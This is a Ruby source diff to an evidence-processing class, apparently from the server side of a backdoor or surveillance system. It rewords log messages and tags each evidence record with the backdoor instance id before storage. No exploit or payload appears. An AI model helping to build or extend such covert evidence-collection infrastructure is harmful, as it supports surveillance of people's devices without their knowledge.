@@ -44,13 +44,13 @@ class InstanceProcessor
   def take_some_rest
     sleep 1
     @seconds_sleeping += 1
-    trace :debug, "[#{Thread.current}][#{@id}] sleeping some [#{@seconds_sleeping}]."
+    trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
   end
   
   def put_to_sleep
     @state = :stopped
     RCS::EvidenceManager.sync_status({:instance => @info['instance']}, RCS::EvidenceManager::SYNC_IDLE)
-    trace :debug, "[#{Thread.current}][#{@id}] sleeping too much, let's stop!"
+    trace :debug, "processor #{@id} is sleeping too much, let's stop!"
   end
   
   def stopped?
@@ -63,7 +63,7 @@ class InstanceProcessor
   
   def queue(id)
     @evidences << id unless id.nil?
-    trace :info, "queueing #{id} for #{@id}"
+    trace :info, "queueing evidence id #{id} for #{@id}"
     
     process = Proc.new do
       resume
@@ -79,6 +79,10 @@ class InstanceProcessor
             evidences = RCS::Evidence.new(@key).deserialize(data)
 
             evidences.each do |evidence|
+              
+              # store backdoor instance in evidence (used when storing into db)
+              evidence.info[:instance] = @id
+
               # find correct processing module and extend evidence
               mod = "#{evidence.type.to_s.capitalize}Processing"
               evidence.extend eval mod if RCS.const_defined? mod.to_sym
@@ -97,17 +101,17 @@ class InstanceProcessor
                       RCS::EvidenceManager.del_evidence(evidence_id, @id)
                       done = true
                     rescue Exception => e
-                      trace :debug, "[#{Thread.current}][#{@id}] DB seems down, waiting for it to resume ... [#{e.message}]"
+                      trace :debug, "[#{@id}] DB seems down, waiting for it to resume ... [#{e.message}]"
                       sleep 1
                     end
                   end
               end
 
-              trace :debug, "[#{Thread.current}][#{@id}] processed #{evidence_id} of type #{evidence.info[:type]}, #{data.size} bytes."
+              trace :debug, "processed evidence #{evidence_id} of type #{evidence.info[:type]} (#{data.size} bytes) for backdoor #{@id}"
             end
-
+          
           rescue EvidenceDeserializeError => e
-            trace :info, "[#{Thread.current}][#{@id}] decoding failed for #{evidence_id}: " << e.to_s
+            trace :warn, "[#{@id}] decoding failed for #{evidence_id}: " << e.to_s
             # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
           rescue Exception => e
             trace :fatal, "FAILURE: " << e.to_s
